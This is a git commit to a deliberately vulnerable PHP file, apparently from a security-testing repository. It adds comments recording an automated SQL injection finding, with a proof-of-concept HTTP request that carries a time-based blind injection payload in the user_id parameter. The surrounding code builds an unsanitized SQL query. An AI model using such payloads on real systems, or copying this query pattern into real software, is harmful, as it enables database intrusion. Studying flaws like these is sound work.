dfa8004dd8932368045226e171f4f07ff9c07efc
bugisup <bugiz300@yandex.ru>
2015-04-13 19:47:06 +0300

    File update

--- vulnerable.php
+++ vulnerable.php
@@ -29,6 +29,12 @@ if(isset($id) && isset($user_id))
 	//Host: localhost
 	//Accept-Encoding: identity
 	//Connection: close
+	//TODO: AI SQL issue #152, High, SQL Injection, https://github.com/userwithrepo/ACSI_S4/issues/152, 1f0328cc
+	//AI exploit:
+	//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-a6077b1/vulnerable.php?user_id=%27+or+sleep%285%29+%3D+%271&id=1 HTTP/1.1
+	//Host: localhost
+	//Accept-Encoding: identity
+	//Connection: close
 	$res = mysql_query("SELECT * FROM messages WHERE msg_id = '$id' AND user_id = '$user_id'") or die(mysql_error());
 	$res = mysql_fetch_assoc($res);
 	//TODO: AI XSS issue #149, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/149, 2a717743
